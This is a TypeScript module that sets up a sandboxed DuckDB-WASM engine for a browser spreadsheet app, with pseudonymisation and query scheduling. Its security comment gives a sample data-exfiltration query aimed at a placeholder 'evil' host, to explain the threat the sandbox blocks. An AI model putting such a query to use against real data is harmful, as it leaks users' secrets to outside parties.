import * as duckdb from '@duckdb/duckdb-wasm'
import { Schema, Table, type RecordBatch } from 'apache-arrow'
import { CLEAN_MACROS } from './clean'
import { FileKindError } from './load-errors'
import { quoteIdent as qi } from './sql'
// Self-hosted engine: Vite emits these as static assets, so nothing loads from a CDN.
// Only the "eh" (wasm exceptions) build is shipped; every current browser supports it.
import ehModuleUrl from '@duckdb/duckdb-wasm/dist/duckdb-eh.wasm?url'
import ehWorkerUrl from '@duckdb/duckdb-wasm/dist/duckdb-browser-eh.worker.js?url'

export interface Engine {
  db: duckdb.AsyncDuckDB
  /** For the app's own reads (grid windows, stats, profiles, charts, metadata). Never used with send(). */
  conn: duckdb.AsyncDuckDBConnection
  /**
   * Runs user SQL and file loads with send(), so they can be cancelled. It has its own connection because
   * DuckDB-WASM abandons a connection's pending send() if another query arrives on that same connection
   * (the grid scrolling, a background snapshot…). Use it only inside withRunLock().
   */
  runConn: duckdb.AsyncDuckDBConnection
  /**
   * For the look-over scans (background()): with send(), whose steps the engine takes in turn with
   * other connections' queries, so a scan never holds up what the user asked for. Only background() uses it.
   */
  bgConn: duckdb.AsyncDuckDBConnection
  /** Extensions that loaded from this site before the sandbox was sealed. */
  extensions: { parquet: boolean; json: boolean }
  /** True once SQL can no longer reach the network or anything outside SANDBOX_DIR. */
  sealed: boolean
}

/** Every file Sheetah hands to DuckDB (opened files, sheets, exports) lives under this virtual folder. */
export const SANDBOX_DIR = '/sheetah/'

/** Builds a safe virtual path inside the sandbox folder for a user-supplied name. */
export const sandboxPath = (name: string) =>
  // Lower-cased: DuckDB detects compression from the extension, and ".CSV.GZ" wouldn't match.
  `${SANDBOX_DIR}${name.replace(/[^A-Za-z0-9._-]+/g, '_').replace(/\.{2,}/g, '_').replace(/\.[A-Za-z0-9.]+$/, (ext) => ext.toLowerCase())}`

/** Results live in their own schema, so they never show up as the user's tables and are shared by both connections. */
export const RESULTS_SCHEMA = '__sheetah'

let enginePromise: Promise<Engine> | null = null

/*
 * Security model: user SQL is untrusted (people paste queries from the internet). DuckDB can read
 * URLs, so a query could otherwise leak data in a request like read_csv('https://evil/?d=' || secret).
 * Before the engine is handed to the app we:
 *   1. load the extensions we need from this site (no remote fallback),
 *   2. allow file access only under SANDBOX_DIR and switch off all other external access,
 *   3. lock the configuration so SQL can't switch any of it back on.
 * The page's Content-Security-Policy (vercel.json) blocks other origins as a second, independent layer.
 */
export function getEngine(): Promise<Engine> {
  enginePromise ??= (async () => {
    const worker = new Worker(ehWorkerUrl)
    const db = new duckdb.AsyncDuckDB(new duckdb.VoidLogger(), worker)
    await db.instantiate(ehModuleUrl)
    // Keep BIGINT as BigInt in Arrow results (exact values; needed for lossless table snapshots).
    await db.open({ query: { castBigIntToDouble: false, castTimestampToDate: false } })
    const conn = await db.connect()
    await conn.query(`SET autoinstall_known_extensions = false; SET autoload_known_extensions = false;`)
    await conn.query(`CREATE SCHEMA IF NOT EXISTS ${RESULTS_SCHEMA}`)

    const repo = new URL(`${import.meta.env.BASE_URL}duckdb-extensions`, location.href).href.replace(/\/$/, '')
    const load = async (name: 'parquet' | 'json') => {
      try {
        await conn.query(`INSTALL ${name} FROM '${repo}'`)
        await conn.query(`LOAD ${name}`)
        return true
      } catch {
        return false // not bundled in this build (e.g. dev server); the UI explains when it's needed
      }
    }
    const [parquet, json] = await Promise.all([load('parquet'), load('json')])

    // Nothing else from outside either: no community extensions, no secrets kept on disk.
    await conn.query(`SET allow_community_extensions = false`)
    await conn.query(`SET allow_persistent_secrets = false`)
    await conn.query(`SET allowed_directories = ['${SANDBOX_DIR}']`)
    await conn.query(`SET enable_external_access = false`)
    await conn.query(`SET lock_configuration = true`)
    // Opened after sealing: the settings above are global, so this connection is sealed too.
    const runConn = await db.connect()
    const bgConn = await db.connect()
    // pseudonym(v): a keyed hash for "Anonymize". Macros and variables belong to a connection.
    sessionKey = pseudonymKey()
    for (const c of [conn, runConn, bgConn]) await definePseudonym(c, sessionKey)
    // number_from_text(), date_from_text()…: what clean-up steps write, so their SQL stays readable.
    for (const c of [conn, runConn, bgConn]) for (const m of CLEAN_MACROS) await c.query(m)
    // How Sheetah's own macros read, to know them again after any script (see unshadow).
    for (const r of (await runConn.query(`SELECT function_name AS f, macro_definition AS d FROM system.main.duckdb_functions() WHERE database_name = 'temp' AND function_name IN (${[...OWN_MACROS].map((n) => `'${n}'`).join(', ')})`)).toArray())
      ownDefinitions.set(String(r.toJSON().f), String(r.toJSON().d))

    return { db, conn, runConn, bgConn, extensions: { parquet, json }, sealed: true }
  })()
  return enginePromise
}

/* --------------------------------- Pseudonyms ---------------------------------- */

const KEY_STORE = 'sheetah:pseudonym-key'
let sessionKey = ''

/**
 * The secret behind pseudonym(): random per session, or kept in this browser if the user asks for
 * stable pseudonyms across visits. It is never written into SQL, links or exports, which makes
 * guessing much harder than with a plain hash (phone numbers and IDs are few enough to try them all).
 * It is pseudonymisation, not anonymity: anyone with this browser's key can recompute the pseudonyms.
 */
function pseudonymKey(): string {
  try {
    const kept = localStorage.getItem(KEY_STORE)
    if (kept && /^[0-9a-f]{64}$/.test(kept)) return kept
  } catch {
    /* storage blocked */
  }
  return Array.from(crypto.getRandomValues(new Uint8Array(32)), (b) => b.toString(16).padStart(2, '0')).join('')
}

async function definePseudonym(c: duckdb.AsyncDuckDBConnection, key: string) {
  await c.query(`SET VARIABLE sheetah_key = '${key}'`)
  // The built-ins by their catalog name: a macro of the same name (sha256 as md5) can't stand in for them.
  await c.query(
    `CREATE OR REPLACE TEMP MACRO pseudonym(v) AS CASE WHEN v IS NULL THEN NULL ELSE system.main.left(system.main.sha256(system.main.getvariable('sheetah_key') || system.main.lower(system.main.trim(v::VARCHAR))), 12) END`,
  )
}

/** Sheetah's own macros: the clean-up steps' (number_from_text…) and pseudonym(). */
const OWN_MACROS = new Set(['pseudonym', ...CLEAN_MACROS.map((m) => /MACRO\s+(\w+)/i.exec(m)?.[1]?.toLowerCase() ?? '')])
/** Their definitions as made at start (macro_definition), to tell them from a script's of the same name. */
const ownDefinitions = new Map<string, string>()

/**
 * After every script: a macro named for a built-in (a "sha256" that's really md5, a "right" that returns
 * the whole phone number), or one of Sheetah's own changed, dropped or copied elsewhere, would quietly
 * change what Anonymize and the clean-up steps compute, though their SQL reads the same. However it was
 * made (CREATE MACRO, or a file read back with IMPORT DATABASE), such a macro is dropped and Sheetah's own
 * are put back; the names are returned so the user is told. The catalog is read by its system name, so a
 * macro called duckdb_functions can't hide anything. (Call inside the run lock.)
 */
export async function unshadow(): Promise<string[]> {
  const { runConn } = await getEngine()
  const own = [...OWN_MACROS].map((n) => `'${n}'`).join(', ')
  const rows = (
    await runConn.query(
      `SELECT database_name AS db, schema_name AS s, function_name AS f, function_type AS t, macro_definition AS d FROM system.main.duckdb_functions()
       WHERE NOT internal AND (function_name IN (SELECT function_name FROM system.main.duckdb_functions() WHERE internal) OR function_name IN (${own}))`,
    )
  )
    .toArray()
    .map((r) => r.toJSON() as { db: string; s: string; f: string; t: string; d: string | null })
  const ours = (r: (typeof rows)[number]) => OWN_MACROS.has(r.f) && r.db === 'temp' && r.s === 'main' && r.d === ownDefinitions.get(r.f)
  const bad = rows.filter((r) => !ours(r))
  const missing = [...OWN_MACROS].filter((n) => !rows.some((r) => r.f === n && ours(r)))
  const key = String((await runConn.query(`SELECT system.main.getvariable('sheetah_key') AS k`)).toArray()[0]?.toJSON().k ?? '')
  if (!bad.length && !missing.length && key === sessionKey) return []
  for (const m of bad) await runConn.query(`DROP MACRO ${m.t === 'table_macro' ? 'TABLE ' : ''}IF EXISTS ${qi(m.db)}.${qi(m.s)}.${qi(m.f)}`)
  for (const m of CLEAN_MACROS) await runConn.query(m)
  await definePseudonym(runConn, sessionKey)
  return [...new Set([...bad.map((m) => m.f), ...missing, ...(key === sessionKey ? [] : ['the pseudonym key'])])]
}

export function keepsPseudonymKey(): boolean {
  try {
    return !!localStorage.getItem(KEY_STORE)
  } catch {
    return false
  }
}

/** Keep (or forget) this session's pseudonym key in this browser, so pseudonyms match next time. */
export async function keepPseudonymKey(keep: boolean): Promise<void> {
  await getEngine()
  try {
    if (keep) localStorage.setItem(KEY_STORE, sessionKey)
    else localStorage.removeItem(KEY_STORE)
  } catch {
    /* storage blocked: pseudonyms stay per session */
  }
}

/** Puts back pseudonym() and its key on runConn (call inside the run lock), in case a script replaced them. */
export async function restorePseudonym(): Promise<void> {
  const { runConn } = await getEngine()
  await definePseudonym(runConn, sessionKey)
}

/** Throws a friendly error if a format's extension isn't available in this build. */
export async function ensureExtension(name: 'parquet' | 'json'): Promise<void> {
  const { extensions } = await getEngine()
  if (extensions[name]) return
  // The whole story (not "didn't read as any of them" beside it): a file kind this build can't open.
  throw new FileKindError(
    `${name === 'parquet' ? 'Parquet' : 'JSON'} support isn’t included in this build. Sheetah only runs code served from its own site, so it won’t fetch it from elsewhere. CSV and Excel files work.`,
  )
}

export { isReserved, quoteIdent, quoteLiteral, sqlName } from './sql'

/** Rows of a small query as plain objects (for metadata, stats, aggregates). */
export async function queryObjects<T = Record<string, unknown>>(sql: string): Promise<T[]> {
  const { conn } = await getEngine()
  const table = await conn.query(sql)
  return table.toArray().map((row) => row.toJSON() as T)
}


/* ------------------------------- Cancellable work -------------------------------- */

export class CancelledError extends Error {
  constructor() {
    super('Query cancelled.')
  }
}
export const isCancel = (e: unknown) => e instanceof CancelledError || /query was cancel|interrupted/i.test(e instanceof Error ? e.message : String(e))

let runTail: Promise<unknown> = Promise.resolve()

/** What holds runConn right now, so a cancel only stops the kind of work it was meant for. */
export type RunKind = 'query' | 'load'
let holder: RunKind | null = null

/** Serialises everything that uses runConn: user queries and file loads run one at a time. */
export function withRunLock<T>(fn: () => Promise<T>, kind: RunKind = 'load'): Promise<T> {
  const run = async () => {
    holder = kind
    try {
      return await fn()
    } finally {
      holder = null
    }
  }
  // Waiting for the lock counts too: the look-over scans hold back from the moment a query is asked for.
  const next = foreground(() => runTail.then(run, run))
  runTail = next.catch(() => {})
  return next
}

/* ------------------------------ Work nobody waits on ------------------------------ */

/*
 * The engine answers one query at a time, in the order they arrive. The look-over scans of a table just
 * opened (a dozen queries over every row) would otherwise sit in front of the next thing the user asks
 * for: a table clicked in the list waited for all of them, seconds on a big file. Scans go through
 * background(): one query at a time, and none while the user's own query, file or rows on screen are in
 * hand, so what the user asked for waits for one scan query at most.
 */
let busy = 0
let idle: (() => void)[] = []

/** Work the user is waiting on (a query, a file, the rows on screen): background reads wait for it. */
export async function foreground<T>(fn: () => Promise<T>): Promise<T> {
  busy++
  try {
    return await fn()
  } finally {
    if (--busy === 0) {
      const waiting = idle
      idle = []
      for (const go of waiting) go()
    }
  }
}

/** Resolves once nothing the user waits on is in hand (or after `most` ms: a long query never stops a scan for good). */
function whenIdle(most: number): Promise<void> {
  if (!busy) return Promise.resolve()
  return new Promise((resolve) => {
    const timer = setTimeout(resolve, most)
    idle.push(() => {
      clearTimeout(timer)
      resolve()
    })
  })
}

interface Job {
  sql: string
  resolve: (t: Table) => void
  reject: (e: unknown) => void
}
/** Scans' queries waiting their turn: the quick ones (a sample's patterns, a count) first, then the slow ones. */
const lanes: [Job[], Job[]] = [[], []]
let pumping = false

async function pump() {
  if (pumping) return
  pumping = true
  try {
    for (;;) {
      await whenIdle(10_000)
      const job = lanes[0].shift() ?? lanes[1].shift()
      if (!job) break
      const { bgConn } = await getEngine()
      try {
        const reader = await bgConn.send(job.sql)
        const batches: RecordBatch[] = []
        for await (const batch of reader) batches.push(batch)
        job.resolve(batches.length ? new Table(batches) : new Table(reader.schema ?? new Schema([])))
      } catch (e) {
        job.reject(normaliseError(e))
      }
    }
  } finally {
    pumping = false
  }
}

const lane = (i: 0 | 1) => ({
  query(sql: string): Promise<Table> {
    return new Promise<Table>((resolve, reject) => {
      lanes[i].push({ sql, resolve, reject })
      void pump()
    })
  },
})

/**
 * A connection's query() for scans: one at a time, after the user's own work, and in steps (send()) that
 * the engine takes in turn with anything asked meanwhile.
 */
export const background = lane(0)
/** The same, for a scan's long run of costly queries (a wide table's columns, ten at a time): after the others. */
export const backgroundSlow = lane(1)

/**
 * send() reports errors as JSON ({"exception_type":"Parser","exception_message":"…"}), query() as
 * "Parser Error: …". Normalise to the readable form so messages and error checks are the same everywhere.
 */
export function normaliseError(e: unknown): Error {
  const err = e instanceof Error ? e : new Error(String(e))
  const text = err.message.trim()
  if (text.startsWith('{')) {
    try {
      const j = JSON.parse(text) as { exception_type?: string; exception_message?: string }
      if (j.exception_message) err.message = `${j.exception_type ?? 'Database'} Error: ${j.exception_message}`
    } catch {
      /* not JSON after all */
    }
  }
  return err
}

/** Runs one statement on runConn with send(), so cancelRunning() can interrupt it. Returns its rows. */
export async function sendAll(sql: string): Promise<Table> {
  const { runConn } = await getEngine()
  try {
    const reader = await runConn.send(sql)
    const batches: RecordBatch[] = []
    for await (const batch of reader) batches.push(batch)
    return batches.length ? new Table(batches) : new Table(reader.schema ?? new Schema([]))
  } catch (e) {
    const err = normaliseError(e)
    if (isCancel(err)) throw new CancelledError()
    throw err
  }
}

/**
 * Interrupts what runConn is doing, if it's that kind of work: starting a new query stops the previous
 * query but never a file that is still loading.
 */
export async function cancelRunning(kind?: RunKind): Promise<boolean> {
  if (!holder || (kind && holder !== kind)) return false
  const { runConn } = await getEngine()
  return runConn.cancelSent()
}
